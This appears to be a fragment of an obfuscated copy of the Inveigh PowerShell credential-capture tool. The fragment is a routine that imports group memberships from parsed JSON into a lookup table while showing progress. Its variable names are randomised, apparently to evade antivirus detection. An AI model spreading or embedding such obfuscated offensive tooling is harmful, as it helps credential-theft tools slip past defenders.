        Write-Output "[*] Importing groups to Inveigh"
        $uNrRBPBK99 = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0
        if(!$KwYylwZk99.Groups)
        {
            Write-Output "[!] JSON groups parse failed"
            throw
        }
        
        $KwYylwZk99.Groups | ForEach-Object {
            if($uNrRBPBK99.Elapsed.TotalMilliseconds -ge 500)
            {
                $vmVBJldx99 = [Math]::Truncate($i / $KwYylwZk99.Groups.Count * 100)
                if($vmVBJldx99 -le 100)
                {
                    Write-Progress -Activity "[*] Importing groups" -Status "$vmVBJldx99% Complete:" -PercentComplete $vmVBJldx99 -ErrorAction SilentlyContinue
                }
                $uNrRBPBK99.Reset()
                $uNrRBPBK99.Start()
            }
            [Array]$UIbFXenE99 = $_.Members | Select-Object -expand MemberName
            $wzCNZfgp99.group_table.Add($_.Name,$UIbFXenE99)
            $UIbFXenE99 = $null
            $i++
        }
        Write-Output "[+] Import completed in $([Math]::Truncate($qCNEIFXf99.Elapsed.TotalSeconds)) seconds"
    }
}
